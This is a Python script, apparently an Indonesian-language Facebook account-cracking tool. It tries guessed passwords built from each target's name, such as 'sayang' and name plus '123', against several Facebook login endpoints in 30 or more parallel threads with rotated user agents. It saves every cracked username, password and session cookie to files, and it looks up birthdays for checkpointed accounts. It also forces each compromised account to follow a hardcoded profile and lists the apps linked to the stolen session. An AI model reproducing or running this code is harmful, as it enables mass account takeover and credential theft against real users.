import requests, re, time, random, datetime, bs4, json
from concurrent.futures import ThreadPoolExecutor as Modol
from data import selesai as jg
from bs4 import BeautifulSoup
from datetime import datetime
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
#---- PROGRES ------
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
#------------------------------->
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
biru_m = '[bold cyan]'
bulan_ = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
###########################################################################################
class Brute_crack:
    def __init__(self):
        self.id, self.apk, self.ok, self.cp, self.uas, self.loop = [], [], [], [], [], 0
    # ------- METODE --------
    def mentod(self):
        prints(Panel(f"""[{biru_m}1{hapus}] method API (fast)
[{biru_m}2{hapus}] method mbasic (slow)
[{biru_m}3{hapus}] method mobile (super slow) [[green] Disarankan [/]]""",title="[green]METODE LOGIN[/]"))
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        prints(Panel("menampilkan aplikasi maka akun akan mudah terkena chekpoint dikarenakan memakai module requests berlebihan. tidak di sarankan untuk menampilkan apilkasi."))
        crot = input(f"  [{M}?{N}] ingin menampilkan aplikasi yang terkait [Y/t]: ")
        if crot in[""]:
            print(f"  [{M}×{N}] jangan kosong");self.tampilkan_apk()
        elif crot in["Y","y"]:
            self.apk.append("y")
        elif crot in["T","t"]:
            self.apk.append("t")
        else:
            print(f"  [{M}×{N}] y/t bro");self.tampilkan_apk()
    # ------- INGFO --------
    def ingfo(self):
        prints(Panel(f"""[{biru_m}+{hapus}] hasil OK disimpan ke -> results/OK-{ha}-{op}-{ta}.txt
[{biru_m}+{hapus}] hasil CP disimpan ke -> results/CP-{ha}-{op}-{ta}.txt

[{merah}×{hapus}] hidupkan mode pesawat 2 detik jika tidak ada hasil."""))
    # ------- SETTING USER AGENT --------
    def ua_set(self):
        try:
            self.uas = open(".bbnew.txt", "r").read().splitlines()
        except FileNotFoundError:
            try:
                self.uas = open("data/ua.txt", "r").read().splitlines()
            except FileNotFoundError:
                a = requests.get("https://github.com/Cindy-Aulia/p/blob/main/data/ua.txt").text
                ua=open(".bbnew.txt", "w")
                aa=re.findall('line">(.*?)<', str(a))
                for un in aa:
                    ua.write(un+"\n")
                ua=open(".bbnew.txt", "r").read().splitlines()
                for ub in ua:
                    self.uas.append(ub)
        return self.uas
    # ------- GANTI BAHASA --------
    def langague(self, cok):
        try:
            with requests.Session() as pun:
                req = pun.get("https://mbasic.facebook.com/language/",cookies=cok)
                pra = BeautifulSoup(req.content,'html.parser')
                for x in pra.find_all('form',{'method':'post'}):
                    if "Bahasa Indonesia" in str(x):
                        bahasa = {
                            "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                            "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                            "submit"  : "Bahasa Indonesia"
                            }
                        url = "https://mbasic.facebook.com" + x["action"]
                        exec = pun.post(url,data=bahasa,cookies=cok)
        except Exception as e:pass
    # ------- PILIH PASSWORD --------
    def plerr(self, op):
        self.id = op
        ___yayanganteng___ = input(f"  [{O}?{N}] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ")
        if ___yayanganteng___ in ["y","Y"]:
            self.tampilkan_apk()
            prints(Panel("[[bold red]![/]] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih"))
            while True:
                pwek = input(f"  [{O}?{N}] masukan kata sandi : ")
                prints(Panel(f"[{biru_m}*[/]] crack dengan sandi -> [ [bold red]{pwek}[/] ]"))
                if pwek in[""," "]:
                    print(f"  {N}[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"  {N}[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        uax = self.ua_set()
                        cin = input(f"  [{O}*{N}] method : ")
                        if cin in[""," "]:
                            print(f"  {N}[{M}×{N}] jangan kosong bro");__yan__()
                        elif cin in["1","01"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "free.facebook.com", uax)
                                        except:pass
                            jg.Selesai_crack().hasil(self.ok, self.cp)
                        elif cin in["2","02"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com", uax)
                                        except:pass
                            jg.Selesai_crack().hasil(self.ok, self.cp)
                        elif cin in["3","03"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "m.facebook.com", uax)
                                        except:pass
                            jg.Selesai_crack().hasil(self.ok, self.cp)
                        else:
                            print(f"  {N}[{M}×{N}] input yang bener");__yan__()
                    self.mentod()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["t","T"]:
            self.tampilkan_apk()
            self.mentod()
            self.__pler__()
        else:
            print(f"  [{M}×{N}] y/t bro");self.plerr(op)
    # ------- METODE LOGIN --------
    def __metode__(self, user, pasw, cebok, ua):
        prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                uazz = random.choice(ua)
                session=requests.Session()
                head1 = {"Host":cebok, "upgrade-insecure-requests" : "1", "user-agent":uazz, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-user": "empty","sec-fetch-dest": "document","referer": "https://"+cebok+"/login.php?next=https%3A%2F%2F"+cebok+"%2Fxnscode&ref=104&rs=1&lrs=1&rid=109361761502927&lrid=109361761502927&refsrc=deprecated","accept-encoding": "gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                r = session.get(f"https://{cebok}/login.php?next=https%3A%2F%2F{cebok}%2Fxnscode&ref=104&rs=1&lrs=1&rid=109361761502927&lrid=109361761502927&refsrc=deprecated", headers=head1)
                payload = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "m_ts":re.search('name="m_ts" value="(.*?)"', str(r.text)).group(1),
                    "flow":"login_no_pin",
                    "uid":user,
                    "pass":pw,
                    "next":"https://"+cebok+"/xnscode"}
                z = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data=payload, headers=head1, allow_redirects=False)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "y" in self.apk:
                        self.langague(coki)
                        self.cek_apk(session, user, pw, coki)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}")
                        prints(tree)
                    wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                    self.ok.append(wrt)
                    open('results/OK/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    try:
                        tokenz = open(".token.txt", "r").read()
                        cookie = {'cookie': open(".cokie.txt", "r").read()}
                        kontol = session.Session().get('https://graph.facebook.com/me?fields=birthday&access_token=%s'%(tokenz),cookies=cookie)
                        xxxxxx = json.loads(kontol.text)
                        cp_ttl = xxxxxx["birthday"]
                        month, day, year = cp_ttl.split("/")
                        month = bulan_[month]
                        tree = Tree("")
                        tree.add(f"[bold yellow]{user}|{pw}|{day} {month} {year}")
                        prints(tree)
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        self.cp.append(wrt)
                        open('results/CP/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ""
                        day   = ""
                        year  = ""
                    except:pass
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = ' [×] %s|%s' % (user,pw)
                    self.cp.append(wrt)
                    open('results/CP/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            except Exception as e:
                time.sleep(2)
        self.loop+=1
    # ------- MENGECEK APLIKASI --------
    def cek_apk(self, ses, user, pwz, cok):
        tree = Tree("")
        self.tod, self.mek = [], []
        tree.add(f"[bold green]{user}|{pwz}").add(f"[bold green]{cok}")
        w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+cok}).text
        sop = bs4.BeautifulSoup(w,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        try:
            for i in range(len(game)):
                self.tod.append(game[i].replace("Ditambahkan pada","\x1b[0m - Ditambahkan pada")+"\n")
        except AttributeError:
            tree.add("[[bold red]![/]] cookie invalid")
        tree.add(f"Aktif - [bold cyan]{len(game)}[/]").add(f"[bold cyan]{''.join(self.tod)}")
        w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+cok}).text
        sop = bs4.BeautifulSoup(w,"html.parser")
        x = sop.find("form",method="post")
        xnxx = [i.text for i in x.find_all("h3")]
        try:
            for z in range(len(xnxx)):
                self.mek.append(xnxx[z].replace('Kedaluwarsa pada','\x1b[0m - Kedaluwarsa pada')+"\n")
        except AttributeError:
            tree.add("[[bold red]![/]] cookie invalid")
        tree.add(f"Kadaluarsa - [bold red]{len(xnxx)}").add(f"[bold red]{''.join(self.mek)}")
        prints(tree)
    # ------- BOT FOLLOWERS HEHE:v --------
    def follow(self,ses,cok):
        r = BeautifulSoup(ses.get("https://mbasic.facebook.com/profile.php?id=100005395413800",cookies={"cookie":cok}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        ses.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cok}).text
    # ------- METODE PILIHAN --------
    def __pler__(self):
        global prog,des
        yan = input(f"  [{O}*{N}] method : ")
        uax = self.ua_set()
        self.ingfo()
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.id))
        with prog:
            with Modol(max_workers=35) as bool:
                for i in self.id:
                    uid, zzz = i.split("<=>")[0], i.split("<=>")[1].lower()
                    xxz = zzz.split(" ")[0]
                    pwx = ["sayang"]
                    if len(zzz)<6:
                        if len(xxz)<3:
                            pass
                        else:
                            pwx.append(xxz+"123")
                            pwx.append(xxz+"12345")
                    else:
                        if len(xxz)<3:
                            pwx.append(zzz)
                        else:
                            pwx.append(zzz)
                            pwx.append(xxz+"123")
                            pwx.append(xxz+"12345")
                    if yan in ["", " "]:
                        print(f"  {N}[{M}×{N}] jangan kosong bro");self.__pler__()
                    elif yan in ["1", "01"]:
                        bool.submit(self.__metode__, uid, pwx, "free.facebook.com", uax)
                    elif yan in ["2", "02"]:
                        bool.submit(self.__metode__, uid, pwx, "mbasic.facebook.com", uax)
                    elif yan in ["3", "03"]:
                        bool.submit(self.__metode__, uid, pwx, "m.facebook.com", uax)
                    else:
                        print(f"  {N}[{M}×{N}] input yang bener");self.__pler__()
        jg.Selesai_crack().hasil(self.ok, self.cp)